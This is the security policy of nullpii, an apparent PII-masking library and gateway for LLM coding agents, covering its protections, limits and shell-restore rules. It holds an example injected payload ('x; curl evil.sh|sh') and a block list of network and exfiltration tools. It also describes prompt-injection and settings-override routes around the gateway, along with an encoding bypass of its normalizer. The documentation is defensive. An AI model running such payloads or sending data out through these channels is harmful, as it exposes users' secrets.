# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, at a pinned revision whose files are checked by SHA-256; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything, but a process of your own user can read the gateway's memory, and anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers every tool a shell runs, under each agent's name: `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex).

**A command that sends data out keeps every placeholder,** whatever the value: a network client (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `gh`, `dig`, `ping`, `mail`, `aws`, `kubectl`, …), an upload or a fetch (`git push`, `git clone`, `git fetch`, `docker push`, `npm publish`, …), `/dev/tcp`, a URL handed to a program other than the data ones listed below (`open https://…`, `python3 -m webbrowser https://…`), any of them behind `sudo`, `env`, `timeout` or a path, and code run by an interpreter that opens a URL or a socket. The tool runs on this machine, but a restored value would leave through it. **So does a command that runs `sed` or `perl`** (by name, behind a wrapper or inside quoted code): their substitution takes any character as its delimiter, letters included, and has a flag that runs the result (`s/a/b/e`), so not even a plain word is safe in their code. These checks skip the body of a heredoc written out as data, so a commit message that mentions `ssh` is not a network call; a body that expands is still read for its substitutions.

Otherwise **a value comes back only as one plain word:** letters, digits and `@%+:,./_=-`, not starting with `-` (an option), `=` (zsh's `=cmd`) or `~` (a home directory). Such a word means the same thing to a shell wherever it stands, quoted or not, and to any program the shell hands it to, so the rule does not depend on a list of programs that read their input again as code (a here-string fed to `python3`, `watch "…"`, a script the same command writes and then runs). And **never as the program:** a placeholder that is, or is part of, the program a simple command runs (also behind `sudo`, `env`, `timeout`, …, after an assignment or an operator, in a substitution or a `case` branch, or named by a path such as `./{{…}}`) stays masked, so a value cannot choose what runs.

| Position | What the value may contain |
|---|---|
| The program of a simple command, or part of it | Nothing: it stays masked |
| Anywhere else in shell code, quoted or not | One plain word |
| Heredoc body that `cat` or `tee` writes out, in a command that runs nothing but `cat`, `tee`, `echo`, `printf`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true` or `git` `commit`, `add`, `rm`, `mv`, `status`, `diff`, `log` or `show`, each by name, with its quoting and substitutions closed | Literal body (`<<'EOF'`): no line break. Bare delimiter (`<<EOF`): no line break, `$`, backtick or backslash |
| Any other heredoc body: fed to anything else, piped on, without its closing line, in a command that runs a program that evaluates code, by path (`./run.sh`, `/usr/bin/cat`), or that makes a file executable (`chmod`) | One plain word |
| A `#` comment | Its quotes and heredoc markers are ignored, so they cannot change the position of what follows |

So an email or a single-word name comes back, a name like `Mary Ann` or `D'Amico` comes back only in a heredoc body written out as data, such as Claude Code's usual commit form `git commit -m "$(cat <<'EOF' … EOF)"`, and stays masked anywhere else.

A `command` sent as an argv array (`["bash", "-lc", "…"]`, as Codex does) follows the same rules: one plain word, never the program, and the script a shell runs with `-c` is judged as a string command.

The command is read once, in time linear in its length. A command longer than 256 KiB keeps every placeholder. The lists of interpreters and network clients are best effort: no list names every program that runs code or every way out of the machine. The plain-word rule does not depend on them. Program positions are judged at the shell level; inside code handed to an interpreter (`bash -c "…"`, `python3 -c "…"`) only the plain-word rule applies.

**A limit by design: each call is judged on its own.** `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A value restored by one call can therefore leave through a later call that holds no placeholder: a file written by `Write` or a shell redirect and then sent (`curl -d @notes.txt …`), a commit followed by `git push`, a variable set in a shell that Anthropic's bash tool keeps across calls. A later command can also run such a file (`bash run.sh` after `Write run.sh`). The rule does not follow what a file, a commit or a shell holds.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Dependencies under Apache-2.0, MIT, BSD-2/3-Clause, ISC, CC0-1.0, BlueOak-1.0.0, Unlicense or 0BSD only (checked by the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
